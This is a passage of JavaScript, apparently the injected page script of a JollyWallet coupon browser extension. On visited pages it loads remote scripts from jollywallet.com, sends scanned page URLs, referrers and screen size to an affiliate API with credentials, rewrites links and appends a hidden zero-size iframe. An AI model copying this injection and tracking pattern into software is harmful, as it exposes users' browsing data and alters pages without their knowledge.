			for(j=0;j<this.unti_bl.length;j++){
				d1=this.unti_bl[j];
				if((url.indexOf(d1)>= 0)) {in_ubl=true;break;}
			}
			if(in_ubl==false) return true;
		}
	}
	return false;
};
tbView.isInBlackListStorage = function() {
 if(typeof(Storage) === 'undefined') return false;
 var ex = null;
 var bl_j = sessionStorage.getItem('jw_bl');
 if(null==bl_j) 
    bl_j = localStorage.getItem('jw_bl');
 if(null!==bl_j){
   var bl = null;
   try {
     bl = JSON.parse(bl_j);
   } catch(e) {
	  bl = '';
   }
   if (typeof(bl.expiration) === 'undefined') {
		localStorage.removeItem('jw_bl');
		sessionStorage.removeItem('jw_bl');
		return false;
   }
   var ex = bl.expiration;
	var n =  new Date();
	if (Date.parse(n) > Date.parse(ex)) {
		localStorage.removeItem('jw_bl');
		sessionStorage.removeItem('jw_bl');
		return false;
 	} else {
		return true;
	}
 }
 return false;
};
tbView.isInBlackList = function(url) {
		if (this.isInBlackListLocal(url)) {
			return true;
		} else if (this.isInBlackListStorage()) {
			return true;
		} 
		return false;
	};
tbView.isInsCache = function (url) {if(typeof tbView.sCachDb=='undefined' || tbView.sCachDb == null)return false;
	var keys = jw_md5.BuildKeys(url);
	if(keys!==null){
		var key='';
		for (var i = 0; i < keys.length; i++) {
			key = keys[i];
			for(var j=0;j<tbView.sCachDb.length;j++) { 
				if(jw_utils.inArray(tbView.sCachDb[j].key, key)) return tbView.sCachDb[j].id;
			}
		}
	}
	return 0;
};

	tbView.get_doc_url = function(){
		try{
			var url = document.URL;
			var urx = '';
			return (urx.length>0) ? urx : url;
		}catch(ex){
			return document.URL;
		}
	};
tbView.loadjscssfile = function (id,filename,filetype,success){
		if( document.getElementById(id)){if(success) success();return;}
		if (filetype=='js'){
			var fileref=document.createElement('script');
			fileref.setAttribute('type','text/javascript');
			fileref.setAttribute('src',filename);
			var done=false;
			if(success)fileref.onload = fileref.onreadystatechange = function(){
				if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) {
					done = true;
					success();
					fileref.onload = fileref.onreadystatechange = null;
				}
			};
		}else if (filetype=='css'){
			var fileref=document.createElement('link');
			fileref.setAttribute('rel','stylesheet');
			fileref.setAttribute('type','text/css');
			fileref.setAttribute('href',filename);
		}
		if (typeof fileref!='undefined'){
			fileref.setAttribute('id',id);
			document.getElementsByTagName('head')[0].appendChild(fileref);
		}
	};
tbView.getCookie = function(c_name) {
	var c_value = document.cookie;
	var c_start = c_value.indexOf(' ' + c_name + '=');
	if (c_start == -1) {c_start = c_value.indexOf(c_name + '=');}
	if (c_start == -1) {c_value = null;	} else {
		c_start = c_value.indexOf('=', c_start) + 1;
		var c_end = c_value.indexOf(';', c_start);
		if (c_end == -1) {c_end = c_value.length;}
		c_value = unescape(c_value.substring(c_start, c_end));
	}
	return c_value;
};
tbView.addInitFrame=function(dist,sub,ver) { if(tbView.isInBlackList(tbView.get_doc_url()) ) return false; return true;};
tbView.isAffiliateRef=function(){
	var ref=document.referrer;
	if((ref.indexOf('.google.')>0) && (ref.indexOf('&ai=')>0)) return '1';
	var aff_list = ['flamingoworld.com','anycodes.com','bradsdeals.com','cdcoupons.com','cheaperseeker.com','chippmunk.com',
'couponalert.com','couponcabin.com','couponchief.com','coupondudes.com','couponfollow.com','couponmountain.com',
'couponpaste.com','coupons.com','dealcatcher.com','dealigg.com','deallocker.com','dealspl.us','dealsvario.com',
'dropdowndeals.com','goodsearch.com','multimediamuse.org','mycoupons.com','offers.com','shareasale.com',
'piggycoupons.com','promocodesforyou.com','retailmenot.com','riocoupon.com','savings-center.com','slickdeals.net',
'thecouponscoop.com','tjoos.com','wantacode.com','yourcoupongirl.com','befrugal.com','couponscave.com','toastybear.com',
'scitechdaily.com','8couponcode.com','couponmom.com','couponwinner.com','dealally.com','deals2buy.com','deals365.us',
'finddiscountcodes.com','megastoredeals.com','promotioncode.org','shopfest.com','sumocoupon.com','techbargains.com','extrabux.com','ebates.com','mikes-top-picks.com'];
	for (var i in aff_list) {aff=aff_list[i];if(ref.indexOf(aff)>1) return '2';}
	return '0';
};
tbView.getDomain = function(url) {
		var regexParse = new RegExp('([a-z\-0-9]{2,63})\.([a-z\.]{2,6})$','i');
		var urlParts = regexParse.exec(url);
		return urlParts[0];
	};
tbView.getSubDomain = function(url) {
		var domain = getDomain(url);
		var subDomain = url.replace(domain,'');
		return subDomain;
	};
tbView.jw_loaded = false;
var jw_jquery = null;
tbView.rethink_tver = function(tver){return tver;}
tbView.is_mobile_template = function(){
	return (tbView.tname=='amp' || (tbView.tname+'_'+tbView.tver)=='bar_8' || tbView.tname=='pc' || tbView.tname=='cpc');
};
tbView.prepare = function(protocol, tname, tver){
tbView.tname=tname;
	tbView.tver=tver;
	tbView.loadjscssfile('jw_0','//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js','js',
		function(){
			if(typeof jw_jquery != 'function'){
				if(typeof $ != 'undefined' && $ != null)
					jw_jquery=$.noConflict(true);
				else if(typeof jQuery != 'undefined' && jQuery != null)
					jw_jquery=jQuery.noConflict(true);
			}
			if (tbView.tname=='amp'){
				tbView.jw_loaded=true;
			} else if (tbView.tname=='pc') {
	  			tbView.loadjscssfile('jw_jcarousel','//static.jollywallet.com/resources/js/jquery.jcarousel.min.js','js',function(){tbView.jw_loaded=true;});
	  		} else if (tver!='12' && !document.getElementById('jw_6')){
				tbView.loadjscssfile('jw_6','//static.jollywallet.com/tlb/v4/jw_fb206/source/jquery.jw_fancybox.js','js',function(){tbView.jw_loaded=true;});
			}
		});
		
		tbView.loadjscssfile('jw_1_2','//static.jollywallet.com/tlb/platform/js/jw_interface_2.js','js');
		if(tver=='100') return;
		if(tver){} else tver='0';
		
		if(tbView.tname=='combo'){
			tbView.loadjscssfile('jw_combo_js_file','//static.jollywallet.com/tlb/v4/jw_combo.js','js',function(){tbView.jw_loaded=true;});
		}else if(tver=='0') {
			tbView.loadjscssfile('jw_3','//static.jollywallet.com/tlb/v3/jw_bar.css','css');
			tbView.loadjscssfile('jw_4','//static.jollywallet.com/tlb/v3/jw_bar.js','js');
		}else if (tver=='12'){	//ads aka special offers
			tbView.loadjscssfile('jw_ad_4','//static.jollywallet.com/tlb/v4/jw_ad.js','js');
		}else{
			tbView.loadjscssfile(tname+'_3','//static.jollywallet.com/tlb/v4/templates/jw_'+tname+'_'+tver+'.js','js');
			tbView.loadjscssfile(tname+'_4','//static.jollywallet.com/tlb/v4/jw_'+tname+'.js','js');
			if (tbView.is_mobile_template()) {
				tbView.loadjscssfile('jw_mobile_file','//static.jollywallet.com/tlb/v4/jw_mobile.js','js');
			}
		}
		
		if (tname!='amp' && tname!='pc' && tname!='combo' && tver!='12'){
			tbView.loadjscssfile('jw_5','//static.jollywallet.com/tlb/v4/jw_fb206/source/jquery.jw_fancybox.css','css');
		}
	};
tbView.open_myaccount = function(){
		if (typeof jw_jquery != 'undefined' && jw_jquery != null) {
			if(	document.getElementById('jw_5') && document.getElementById('bar_4') && document.getElementById('bar_3') && 
				document.getElementById('jw_1_2') && document.getElementById('jw_0') && tbView.jw_loaded===true){
				if(typeof jwBarInterface != 'undefined'){ 
					jwBarInterface.token='ED4D4804-6179-F04E-FF7C-D036BB890245';
					jwBarInterface.aff_id=''; 
					jwBarInterface.jw_open_popup('myaccount'); 
					return;
				} 
			}
		}
		setTimeout(function(){tbView.open_myaccount();},20);
	};
tbView.myaccount = function(ref){
		var protocol = 'http://';
		if( document && document.location) 
			if('https:' == document.location.protocol) 
				protocol='https://'; 
		tbView.prepare(protocol, 'bar','1'); 
		setTimeout(function(){tbView.open_myaccount();},20);
	};
tbView.verify_load = function(success, tname, only_jquery){
 if (typeof jw_jquery != 'undefined' && jw_jquery != null) {
		if((typeof only_jquery != 'undefined') && (only_jquery===true)){success(); return;}
		var is_mobile_template = tbView.is_mobile_template();
		if((tbView.tname=='amp' || document.getElementById('jw_5')) 
				&& document.getElementById(tname+'_3') 
				&& document.getElementById(tname+'_4') 
				&& ((is_mobile_template && document.getElementById('jw_mobile_file')) || (!is_mobile_template)) 
				&& document.getElementById('jw_1_2') 
				&& document.getElementById('jw_0')) {
			if(typeof jwBarInterface != 'undefined'){ success(); return;}
		}
		if ((tbView.tname=='pc') 
				&& document.getElementById(tname+'_3') 
				&& document.getElementById(tname+'_4')) { 
			if(typeof jwBarInterface != 'undefined'){ success(); return;}
		}}
	setTimeout(function(){tbView.verify_load(success, tname, only_jquery);},20);
};
tbView.start_search = function(index){
		if(jw_jquery(document).find('#jw_box_1').length>0) return;        
		_jw_search.init();
		_jw_search.tid='';
		_jw_search.dist='336';
		_jw_search.dist_sub='brow_ff';
		var _timeout=1;
		var icon = new Image(); 
		icon.src = '//static.jollywallet.com/resources/images/jw/logo_22X22u.png';
		
		window.setTimeout(function(){
			_jw_search.dom_scanner(index);
			if(_jw_search.urls && _jw_search.urls.length>0) 
			{
				jw_jquery(document).on('onkeydown', '#jw_input_email, #jw_input_pass', 
					function(e){e.stopPropagation();}
				);
				
				//load css if its not in page already.
				var jw_css_url = '//api.jollywallet.com/search/jw_search.css';
				if (jw_jquery("link[href='"+jw_css_url+"']").length<1)
					tbView.loadjscssfile('jw_search_css', jw_css_url, 'css', null);
					
				jw_jquery(document).on('input', '#jw_input_email',
					function(e) {
						var txt = jw_jquery.trim(jw_jquery(this).val());
						if (txt.length < 3)
							jw_jquery('#jw_continue_button').addClass('jw_disabled_btn');
						else
							jw_jquery('#jw_continue_button').removeClass('jw_disabled_btn');
				});
			
				var u='//api.jollywallet.com/affiliate/search?dist='+_jw_search.dist+'&sub='+_jw_search.dist_sub+'&p=0&token=ED4D4804-6179-F04E-FF7C-D036BB890245&ver=0&ref='+index+'&r='+Math.random()+'&ulist='+encodeURIComponent(JSON.stringify(_jw_search.urls));
			 	jw_jquery.ajax({
					url: u,
					type: 'GET',
					crossDomain: true,
					dataType: 'json',
					xhrFields: {withCredentials: true},
					success:function(data){
						try{
							var t0=1;	// standard link display, 
							var t1=0;	// upper bar
							var t2=0;	// unified link.
							var t3=0;	// relocate.
							var t4=0;	// relocate random
							if(data.display){
								if(data.display.t0) t0=data.display.t0;
								if(data.display.t1) t1=data.display.t1;
								if(data.display.t2) t2=data.display.t2;
								if(data.display.t3) t3=data.display.t3;
								if(data.display.t4) t4=data.display.t4;
							}
							if(t0==1){
								for(n in _jw_search.urls_pos){
									u=_jw_search.urls_pos[n];
									_jw_search.update_node(n, data[u], t2);
								}
							}
							if (jw_jquery('#jw_omni_iframe').length<1)
								jw_jquery('body').append('<div style="height:1px;width:1px;position:absolute;top:10000px;left:0px;"><iframe id="jw_omni_iframe" src="" style="visibility:hidden;" width="0px" height="0px" /></div>');
							if(t1==1 && _jw_search.t1) _jw_search.t1(data,index);
							if(t3==1 && _jw_search.t3) _jw_search.t3(new Array(t1,t2,t3,t4));
							if(t4==1 && _jw_search.t4) _jw_search.t4(new Array(t1,t2,t3,t4));
						}catch(ex){}
					},
				});
			}
		},_timeout);
	}
tbView.set_ga = function(_p, _e) {
if(typeof(Storage) !== 'undefined') { 
  var a = sessionStorage.getItem('jw_e_'+_e);
  if(null==a) sessionStorage.setItem('jw_e_'+_e,1);
  else {return;}
}else {}
try {
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create','UA-38503582-1','auto',{'name':'jw_ga'});
ga('jw_ga.set','page','');
if(_p==1) ga('jw_ga.send','pageview');
ga('jw_ga.send','event','jw',_e);
} catch(e){}
};
tbView.disableBar = function(expirationDate, reason) {
   var created = new Date();
	var storageStr = '{"created" : "'+created+'" , "expiration" : "'+expirationDate+'" , "reason" : "'+reason+'"}';
	if(typeof(Storage)!=='undefined'){localStorage.setItem('jw_bl', storageStr);}
};
tbView.disableBarSession = function(reason) {
	var created = new Date();
	var expirationDate = new Date(Date.parse(created) + 20*60000);
	var storageStr = '{"created" : "'+created+'" , "expiration" : "'+expirationDate+'" , "reason" : "'+reason+'"}';
	if(typeof(Storage)!=='undefined'){sessionStorage.setItem('jw_bl', storageStr);}
};
tbView.start = function(cnt){
	if(tbView.isInBlackList(tbView.get_doc_url())) return;
	tbView.sCachDb = [{id:2,key:'5ed33f7008771c9d49e3716aeaeca581'}];
	var search_index= tbView.isInsCache(tbView.get_doc_url());
	if(search_index>0){
		if(typeof jQuery != 'undefined' && jQuery != null) {
			jw_jquery=jQuery.noConflict(true);
		} else {
			var protocol = 'http://';
			if( document && document.location) if('https:' == document.location.protocol) protocol='https://'; 
			tbView.prepare(protocol,'bar',100);
		}
		tbView.verify_load(function(){tbView.start_search(search_index);}, 'bar', true)
		if(search_index==6) setInterval(_jw_search.g_search, 350);	} 
	else {
			var aff_ref=tbView.isAffiliateRef();
			var r=jw_md5.extract_sub(document.referrer);
			var e='';if(r != null) e='&docref='+r;
 			var _aqs = '';
 			if(typeof(Storage) != 'undefined') {
             ps = sessionStorage.getItem('rym_content');
             if (ps != null) {
                var p = null;
                try {
                   p = JSON.parse(ps);
                } catch(e) {
	                 p = '';
                }
                if (typeof(p.expiration) === 'undefined') {
		             sessionStorage.removeItem('rym_content');
                } else {
                   var ex = p.expiration;
	                 var n =  new Date();
	                 if (Date.parse(n) > Date.parse(ex)) {
		                sessionStorage.removeItem('rym_content');
 	                 } else {
                      _aqs = p.params;
                   }
                }
             }
          }
			tbView.loadjscssfile('jw_a','//query.jollywallet.com/affiliate/jsquery2?dist=336&sub=brow_ff&ver=1&p=0&token=ED4D4804-6179-F04E-FF7C-D036BB890245&aff_ref='+aff_ref+e+'&r='+Math.random()+'&width='+window.screen.width+'&height='+window.screen.height+_aqs,'js',null);
	} 
};
if(window==window.top && jw_ignore===false) tbView.start();